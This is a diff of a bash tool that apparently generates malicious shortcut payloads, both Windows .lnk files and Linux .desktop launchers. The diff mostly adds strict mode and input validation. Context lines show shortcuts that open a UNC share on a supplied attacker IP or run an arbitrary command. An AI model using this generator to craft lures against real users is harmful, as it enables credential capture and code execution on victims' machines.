@@ -1,5 +1,27 @@
 #!/usr/bin/env bash
 
+# Immediately enable “strict mode” so that:
+#  - any unbound variable causes an error (-u)
+#  - any failed command causes an exit (-e)
+#  - any failure in a pipeline causes the pipeline to fail (-o pipefail)
+set -euo pipefail
+
+VERSION=1    # <–– initialize VERSION to avoid unbound errors under strict mode
+
+# Initialize variables to avoid unbound errors under strict mode:
+ARGUMENTS=""
+COMMAND=""
+IP=""
+ENVIRONMENT=""
+SHARE=""
+NAME=""
+DESCRIPTION=""
+ICON=""
+WINDOW=""
+WORKINGDIRECTORY=""
+OUTPUT=""
+PAYLOAD=""
+
 function print() {
     local status="${1}"
     local message="${2}"
@@ -26,7 +48,7 @@ function check_program() {
 
 function check_dependencies() {
     local -a programs=("getopt" "wine" "desktop-file-edit")
-    local -a missing
+    local -a missing=() # <–– initialize missing to avoid unbound errors under strict mode
     local -a powershell=("${WINEPREFIX_DIRECTORY}/drive_c/Program Files/PowerShell/"*/pwsh.exe)
 
     if [[ ! -d "${WINEPREFIX_DIRECTORY}" ]]
@@ -55,7 +77,7 @@ function check_dependencies() {
     [[ ! -f "${powershell[0]}" ]] && missing+=("powershell")
     shopt -u nullglob
 
-    if ((${#missing} > 0))
+    if ((${#missing[@]} > 0)) # <–– if missing is not empty, print an error and quit
     then
         print "error" "Required dependencies: ${missing[*]}"
         quit 1
@@ -112,6 +134,8 @@ function generate() {
                 print "error" "Command and arguments must be passed!"
                 quit 1
             fi
+
+        # check if IP is passed if command is not passed
         elif [[ -n "${IP}" ]]
         then
             local unc
@@ -152,8 +176,9 @@ function generate() {
 
             script+="\$Shortcut.TargetPath = 'C:/Windows/explorer.exe'\n"
             script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
+        
         else
-            print "error" "IP parameter must at least be passed!"
+            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
             quit 1
         fi
 
@@ -172,11 +197,13 @@ function generate() {
             script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
         fi
 
-        if [[ -z "${WINDOW}" ]]
+        if [[ -n "${WINDOW}" ]]
         then
-            script+="\$Shortcut.WindowStyle = ${windowstyle['normal']}\n"
-        elif [[ -n "${WINDOW}" ]]
-        then
+            if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
+            then
+                print "error" "Invalid window style: ${WINDOW}"
+                quit 1
+            fi
             script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
         fi
 
@@ -203,11 +230,12 @@ function generate() {
         then
             arguments+=("--set-key='Encoding'")
             arguments+=("--set-value='UTF-8'")
-            arguments+=("--set-name='${NAME}'")
+            arguments+=("--set-key='Name'")
+            arguments+=("--set-value='${NAME}'")
             arguments+=("--set-key='Version'")
             arguments+=("--set-value='1.0'")
         else
-            error "Name must be passed!"
+            print "error" "Name must be passed!"
             quit 1
         fi
 
@@ -220,13 +248,19 @@ function generate() {
             arguments+=("--set-key='Exec'")
             arguments+=("--set-value='${COMMAND}'")
         else
-            error "At least command and/or arguments must be passed!"
+            print "error" "At least command and/or arguments must be passed!"
             quit 1
         fi
 
         if [[ -n "${DESCRIPTION}" ]]
         then
             arguments+=("--set-comment='${DESCRIPTION}'")
+        fi
+
+        if (( ${#ARGUMENTS} >= 260 ))
+        then
+            print "error" "Arguments must not exceed more than 260 characters"
+            quit 1
         fi
 
         if [[ -n "${WORKINGDIRECTORY}" ]]
@@ -409,6 +443,17 @@ function main() {
     check_dependencies
 
     ((VERSION == 1)) && echo "${0} version: v1.0"
+
+    # Require either -c or -i (but not both) for 'lnk' payloads
+    if [[ "${PAYLOAD}" == "lnk" ]]; then
+        if [[ -n "${COMMAND}" && -n "${IP}" ]]; then
+            print "error" "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
+            quit 1
+        elif [[ -z "${COMMAND}" && -z "${IP}" ]]; then
+            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+            quit 1
+        fi
+    fi
 
     if [[ -n "${OUTPUT}" ]]
     then
